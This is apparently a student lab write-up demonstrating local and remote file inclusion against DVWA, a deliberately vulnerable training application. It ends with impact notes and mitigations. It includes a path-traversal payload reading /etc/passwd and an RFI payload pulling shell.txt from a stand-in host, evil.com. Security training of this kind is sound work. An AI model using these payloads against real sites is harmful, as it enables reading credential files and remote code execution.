Task 4 – File Inclusion Attacks in DVWA
🎯 Objective
To understand and demonstrate Local File Inclusion (LFI) and Remote File Inclusion (RFI) vulnerabilities using DVWA.

🛠 Tools Used
Kali Linux
DVWA (Damn Vulnerable Web Application)
Web Browser (Firefox/Chromium)

📌 What is File Inclusion?
File Inclusion vulnerabilities happen when a website allows user input to decide which file to load.
If not secured, attackers can:
read sensitive files
execute malicious code
take control of the web server

Types:
Local File Inclusion (LFI) – load files from same server
Remote File Inclusion (RFI) – load files from remote server (if enabled)

🧭 Steps Performed
✔ Step 1 – Open DVWA
Logged in to DVWA successfully
Navigated to File Inclusion module from left menu

✔ Step 2 – Understand vulnerable parameter
In the URL bar, DVWA uses:
?page=<file>
This parameter is vulnerable because user controls the filename.

✔ Step 3 – Perform Local File Inclusion (LFI)
Tried reading Linux password file using path traversal:
?page=../../../../etc/passwd

👉 Result:
gained access to /etc/passwd
confirmed LFI vulnerability

✔ Step 4 – Explained Impact of LFI
Through LFI, an attacker may:
read configuration files
read usernames
find SSH keys
escalate to Remote Code Execution in real systems

✔ Step 5 – Tried Remote File Inclusion (RFI) (if enabled)
Payload example (conceptual):
?page=http://evil.com/shell.txt
DVWA may block this depending on security level.

🧪 Results & Observations
DVWA is vulnerable to Local File Inclusion
Sensitive files were accessed using directory traversal
Application does not validate user input in page parameter
RFI depends on PHP configuration (allow_url_include)

🔐 Mitigation & Prevention:
To prevent File Inclusion:
Validate and whitelist filenames
Disable allow_url_include in PHP
Use absolute file paths instead of user input
Implement input sanitization
Apply least privilege to web server user

✅ Conclusion
Task 4 successfully demonstrated:
Local File Inclusion (LFI) attack
How attackers access sensitive files
Security impact of improper input validation
DVWA helps understand how real websites get compromised due to insecure file handling.
